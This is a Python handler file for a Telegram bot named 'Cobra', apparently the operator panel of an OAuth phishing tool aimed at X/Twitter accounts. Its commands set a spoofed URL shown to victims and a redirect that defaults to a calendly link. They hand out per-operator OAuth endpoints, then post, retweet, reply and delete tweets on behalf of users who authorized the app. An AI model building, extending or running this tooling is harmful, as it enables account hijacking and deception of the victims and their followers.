import uuid
from bot.handlers import keyboards

from telegram import Update
from telegram.ext import ContextTypes

from shared.db import get_db
from shared.config import config
from shared.utils import parse, permission_check

parse_mode = "MarkdownV2"

db = get_db()
groups = db["groups"]

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id

    full_name = parse(update.effective_user.full_name)

    reply_markup = keyboards.add_to_group()
    text = f"🐍 *Welcome to Cobra, _{full_name}_*\\! 🐍\n\n💬 _To get started, add me to a group and use the */setup* command to setup your group for OAuth\\._"

    await context.bot.send_message(chat_id, text, parse_mode, reply_markup=reply_markup)

async def unsubscribed(update, context):
    chat_id = update.effective_chat.id

    reply_markup = keyboards.unsubscribed()
    text = "❗ *JOIN THE CHANNEL TO USE COBRA* ❗\n\n_⚠️ It seems that you aren't in the channel\\. Join the channel using the button below to continue\\._"
    
    await context.bot.send_message(chat_id, text, parse_mode, reply_markup=reply_markup)

async def help(update, context) -> None:
    chat_id = update.effective_chat.id
    
    text = "❔ *List of Commands*\n\n *•* 🐦 */post\\_tweet* \\<username\\> \\<message\\> \\- Posts a tweet on behalf of the user\\.\n *•* 🔁 */post\\_retweet* \\<username\\> \\<tweet\\_id\\> \\- Retweets a tweet on behalf of the user\\.\n *•* 💬 */post\\_quote\\_tweet* \\<username\\> \\<tweet\\_url\\> \\<message\\> \\- Quotes a tweet on behalf of the user\\.\n *•* 💬 */post\\_reply* \\<username\\> \\<tweet\\_id\\> \\<message\\> \\- Posts a reply to a tweet on behalf of the user\\.\n *•* ❌ */delete\\_tweet* \\<username\\> \\<tweet\\_id\\> \\- Deletes a tweet on behalf of the user\\.\n *•* 👤 */whitelist* \\<id\\> \\- Adds/removes a user id from the command whitelist\\.\n *•* 📄 */display\\_whitelist* \\- Displays the list of users authorized to use admin commands in the group\\.\n *•* 👥 */display\\_users* \\- Displays the list of authenticated users\\.\n *•* 🔗 */display\\_endpoint* \\- Displays your personal endpoint\\.\n *•* 🆔 */set\\_client\\_id* \\<client\\_id\\> \\- Sets the OAuth application client id\\.\n *•* 🔒 */set\\_client\\_secret* \\<client\\_secret\\> \\- Sets the OAuth application client secret\\.\n *•* 🔄 */set\\_redirect* \\<url\\> \\- Sets the redirect upon authorization\\.\n *•* 🌀 */set\\_spoof* \\<url\\> \\- Sets the spoof url shown in X/Twitter and refreshes endpoints\\.\n *•* 💬 */set\\_replies* \\- Enables/disables replies for tweets\\.\n *•* 𝕏 */check\\_auth* \\<username\\> \\- Checks if a user is still authorized\\.\n *•* ❔ */help* \\- Displays the list of commands\\."
    await context.bot.send_message(chat_id, text, parse_mode)

async def setup(update, context):
    chat_id = update.effective_chat.id

    if await permission_check(update): return

    group = groups.find_one({"group.id": chat_id})
    if group:
        text = "⚠️ *This group is already setup for OAuth\\.*"
        return await context.bot.send_message(chat_id, text, parse_mode)

    owner = next(admin.user for admin in await context.bot.get_chat_administrators(chat_id) if admin.status == "creator")
    owner_id = owner.id
    owner_fullname = parse(owner.full_name)

    chat_title = update.effective_chat.title

    group_data = {
        "owner_id": owner_id,
        "group": {
            "id": chat_id,
            "title": chat_title
        },
        "client": {
            "id": None,
            "secret": None
        },
        "spoof": "https://calendly.com/cointele",
        "redirect": "https://calendly.com/cointele",
        "replies": False,
        "whitelist": [],
        "identifiers": [
            {
                "user_id": owner_id,
                "identifier": str(uuid.uuid4())
            }
        ],
        "users": []
    }
    groups.insert_one(group_data)

    text = f"✅ *Group successfully setup for OAuth\\.*\n\n╭  ℹ️ *GROUP INFO*\n┣  *Group ID:* {parse(chat_id)}\n┣  *Group Name:* {parse(chat_title)}\n┣  *Owner ID*: {owner_id}\n╰  *Owner Name:* {owner_fullname}\n\n💬 _Use the */help* command to get the list of available commands\\._"
    await context.bot.send_message(chat_id, text, parse_mode)

async def display_endpoint(update, context) -> None:
    chat_id = update.effective_chat.id
    
    if await permission_check(update, groups): return

    user_id = update.effective_user.id

    group = groups.find_one({"group_id": chat_id})
    matched = next(i for i in group["identifiers"] if i["user_id"] == user_id)

    client_id = group["client"]["id"]
    client_secret = group["client"]["secret"]

    if not client_id or not client_secret:
        text = f"Client {"ID" if not client_id else "secret"} hasn't been set yet.\n\n💬 _To set the client {"ID" if not client_id else "secret"}, use the */set_client_{"id" if not client_id else "secret"}* command followed by the OAuth app client {"ID" if not client_id else "secret"}\\."
    else:
        identifier = matched["identifier"]
        endpoint = parse(config["DOMAIN"] + f"/oauth?i={identifier}")

        reply_markup = keyboards.refresh()
        text = f"🔗 *Your endpoint*: {endpoint}"

    await context.bot.send_message(chat_id, text, parse_mode)